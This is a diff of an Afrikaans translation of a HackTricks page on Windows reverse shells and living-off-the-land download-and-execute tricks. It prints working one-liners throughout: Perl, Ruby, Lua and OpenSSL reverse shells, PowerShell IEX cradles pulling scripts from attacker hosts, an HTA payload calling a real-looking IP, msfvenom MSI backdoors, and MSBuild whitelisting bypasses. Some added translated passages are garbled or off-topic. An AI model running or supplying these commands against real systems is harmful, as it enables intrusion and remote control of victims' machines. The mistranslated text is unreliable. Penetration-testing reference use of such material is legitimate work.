@@ -8,15 +8,15 @@ Ander maniere om HackTricks te ondersteun:
 
 * As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
 * Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
+* **Deel jou haktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
 
 </details>
 
 **Probeer Hard Security Group**
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -25,7 +25,7 @@ Ander maniere om HackTricks te ondersteun:
 ## Lolbas
 
 Die bladsy [lolbas-project.github.io](https://lolbas-project.github.io/) is vir Windows soos [https://gtfobins.github.io/](https://gtfobins.github.io/) is vir Linux.\
-Duidelik is daar **geen SUID-lêers of sudo-voorregte in Windows nie**, maar dit is nuttig om te weet **hoe** sommige **binêre lêers** (mis)bruik kan word om sekere onverwagte aksies uit te voer soos **die uitvoer van arbitrêre kode.**
+Duidelik is daar **nie SUID-lêers of sudo-voorregte in Windows nie**, maar dit is nuttig om te weet **hoe** sommige **binêre lêers** (mis)bruik kan word om sekere onverwagte aksies uit te voer soos **die uitvoer van willekeurige kode.**
 
 ## NC
 ```bash
@@ -61,6 +61,10 @@ perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen(
 ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```
 ## Lua
+
+### Lua
+
+Lua is 'n kragtige, effektiewe, en vinnige skriptaal wat dikwels gebruik word vir die ontwikkeling van sagteware, insluitend speletjies, webtoepassings, en ander sagtewareprojekte. Lua is maklik om te leer en te gebruik, en dit bied 'n groot verskeidenheid biblioteke en raamwerke vir ontwikkelaars om van te kies. Lua kan ook gebruik word vir die skryf van skadelike skrifte en aanvalswerktuie, soos bots en exploits. Lua-skrips kan uitgevoer word op verskeie platforms, insluitend Windows, Linux, en macOS. Lua word dikwels gebruik in die hacker-gemeenskap vir die ontwikkeling van aanvalswerktuie en skadelike programme.
 ```bash
 lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
 ```
@@ -72,9 +76,9 @@ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -node
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
 ```
-## Sluiting van die slagoffer
+## Slachtoffer
 
-Die sluiting van die slagoffer is 'n kritieke stap in 'n aanval. Dit behels die oorname van beheer oor 'n masjien wat deur 'n aanvaller gebruik kan word om verdere aksies uit te voer.
+Die eerste stap in die aanval is om 'n slachtoffer te identifiseer. Dit kan 'n enkele rekenaar of 'n hele netwerk wees. Die keuse van 'n slachtoffer kan afhang van verskeie faktore, insluitend die doel van die aanval en die kwesbaarhede van die stelsel.
 ```bash
 #Linux
 openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
@@ -90,7 +94,7 @@ Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadStr
 echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
 ```
 Proses wat netwerkoproep uitvoer: **powershell.exe**\
-Lading geskryf op skyf: **NEE** (_ten minste nêrens wat ek kon vind deur procmon te gebruik!_)
+Lading geskryf op skyf: **GEEN** (_ten minste nêrens wat ek kon vind deur procmon te gebruik!_)
 ```bash
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
@@ -115,7 +119,7 @@ mshta http://webserver/payload.hta
 ```bash
 mshta \\webdavserver\folder\payload.hta
 ```
-#### **Voorbeeld van hta-psh omgekeerde skaal (gebruik hta om PS agterdeur af te laai en uit te voer)**
+#### **Voorbeeld van hta-psh omgekeerde skaal (gebruik hta om PS backdoor af te laai en uit te voer)**
 ```xml
 <scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
 ```
@@ -308,7 +312,10 @@ Aanvaller
 msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
 python -m SimpleHTTPServer 80
 ```
-## Slachtoffer:
+### Slachtoffer:
+
+```plaintext
+```
 ```
 victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
 ```
@@ -342,8 +349,8 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object N
 ```
 cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
 ```
-Jy kan hierdie tegniek gebruik om Toepassingswitlysing en Powershell.exe beperkings te omseil. Aangesien jy met 'n PS-skul gekonfronteer sal word.\
-Net aflaai en uitvoer: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
+Jy kan hierdie tegniek gebruik om Toepassingswitlysing en Powershell.exe-beperkings te omseil. Aangesien jy met 'n PS-skul gekonfronteer sal word.\
+Net aflaai en uitvoer dit: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
 ```
@@ -355,7 +362,7 @@ Kompileer C#-kode op die slagoffer se masjien.
 ```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
 ```
-Jy kan 'n basiese C# omgekeerde dop van hier af laai: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
+Jy kan 'n basiese C# omgekeerde dop van hier af aflaai: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
 
 **Nie opgespoor nie**
 
@@ -389,13 +396,13 @@ In die **Skulpe**-vouer is daar baie verskillende skulpe. Om Invoke-_PowerShellT
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
-Begin deur die skrip in 'n webbediener te bedien en dit aan die slagoffer se kant uit te voer:
+Begin deur die skrip in 'n webbediener te bedien en voer dit aan die slagoffer se kant uit:
 ```
 powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
 ```
 Verdediger beskou dit nie as skadelike kode nie (nog nie, 3/04/2019).
 
-**TODO: Kontroleer ander nishang shells**
+**TODO: Kontroleer ander nishang doppe**
 
 ### **PS-Powercat**
 
@@ -440,7 +447,7 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 
 
 [https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)
 
-Skep 'n Powershell weergawe van Metasploit agterdeur deur Eenhoorn te gebruik
+Skep 'n PowerShell weergawe van Metasploit agterdeur deur eenhoorn
 ```
 python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
 ```
@@ -448,7 +455,7 @@ Begin msfconsole met die geskepte hulpbron:
 ```
 msfconsole -r unicorn.rc
 ```
-Begin 'n webbediener wat die _powershell\_attack.txt_ lêer bedien en voer in die slagoffer uit:
+Begin deur 'n webbediener te begin wat die _powershell\_attack.txt_ lêer bedien en voer uit op die slagoffer:
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ```
@@ -456,7 +463,7 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 
 ## Meer
 
-[PS>Aanval](https://github.com/jaredhaight/PSAttack) PS-konsole met 'n paar aanvallige PS-modules vooraf gelaai (gekodeer)\
+[PS>Aanval](https://github.com/jaredhaight/PSAttack) PS-konsole met 'n paar aanvallige PS-modules wat vooraf gelaai is (gekodeer)\
 [https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
 WinPWN](https://github.com/SecureThisShit/WinPwn) PS-konsole met 'n paar aanvallige PS-modules en proksideteksie (IEX)
 
@@ -472,19 +479,19 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) PS-konsole met 'n paar aanvall
 ​
 **Probeer Hard Security Group**
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
 <details>
 
-<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Leer AWS hak van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Ander maniere om HackTricks te ondersteun:
 
-* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
+* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kontroleer die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
 * Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
+* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
 * **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
 
